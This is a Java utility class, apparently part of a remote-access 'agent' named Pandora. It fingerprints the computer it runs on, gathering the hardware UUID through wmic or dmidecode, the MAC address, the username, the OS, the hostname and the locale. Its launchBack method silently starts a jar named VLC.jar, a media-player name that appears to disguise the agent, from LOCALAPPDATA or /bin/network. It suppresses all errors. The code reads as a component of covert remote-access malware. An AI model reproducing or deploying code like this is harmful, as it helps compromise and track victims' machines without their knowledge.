package org.pandora.agent.utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.Enumeration;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class Computer {

    private final boolean windows;
    public String lastUuid;

    public Computer(final boolean windows) {
        this.windows = windows;
    }

    public void launchBack() {
        try {
            Runtime.getRuntime().exec(this.windows ? "java -Dfile.encoding=UTF8 -jar " + System.getenv("LOCALAPPDATA") + "\\VLC\\VLC.jar 2" : "java -Dfile.encoding=UTF8 -jar /bin/network/VLC.jar 2");
        } catch (final IOException ignore) {
        }
    }

    public String getIdentifier() {
        String uuid;
        try {
            final StringBuilder output = new StringBuilder();
            new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(this.windows ? "wmic csproduct get UUID" : "dmidecode -s system-uuid").getInputStream())).lines().forEach(line -> output.append(line).append("\n"));
            uuid = this.windows ? this.removeColons(this.getComputer()) + "-" + output.substring(output.indexOf("\n"), output.length()).trim() : this.removeColons(this.getComputer()) + "-" + output.toString().replaceAll("\n", "");
        } catch (final IOException ignore) {
            uuid = "agent-" + this.removeColons(this.getComputer()) + "-" + this.removeColons(this.getUsername());
        }
        this.lastUuid = uuid;
        return uuid;
    }

    public String getMacAddress() {
        if (this.windows) {
            try {
                final byte[] mac = NetworkInterface.getByInetAddress(InetAddress.getLocalHost()).getHardwareAddress();
                return this.removeColons((IntStream.range(0, mac.length).mapToObj(i -> String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : "")).collect(Collectors.joining())));
            } catch (final Exception ignore) {
            }
        } else {
            try {
                final Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
                while (networkInterfaces.hasMoreElements()) {
                    final byte[] mac = networkInterfaces.nextElement().getHardwareAddress();
                    if (mac != null)
                        return this.removeColons(IntStream.range(0, mac.length).mapToObj(i -> String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : "")).collect(Collectors.joining()));
                }
            } catch (final IOException ignore) {
            }
        }
        return this.removeColons(this.getIdentifier());
    }

    public String getUsername() {
        return this.removeColons(System.getProperty("user.name"));
    }

    public String getOs() {
        return this.removeColons(System.getProperty("os.name"));
    }

    public String getComputer() {
        if (this.windows) {
            final Map<String, String> env = System.getenv();
            if (env.containsKey("COMPUTERNAME")) return this.removeColons(env.get("COMPUTERNAME"));
            else return this.removeColons(env.getOrDefault("HOSTNAME", "Unknown"));
        } else {
            try {
                return this.removeColons(InetAddress.getLocalHost().getHostName());
            } catch (final UnknownHostException ignore) {
                return "computer-" + new Random().nextInt(Integer.MAX_VALUE);
            }
        }
    }

    public String getCountry() {
        return this.removeColons(Locale.getDefault().getCountry());
    }

    private String removeColons(final String text) {
        return text.replace(":", "");
    }
}
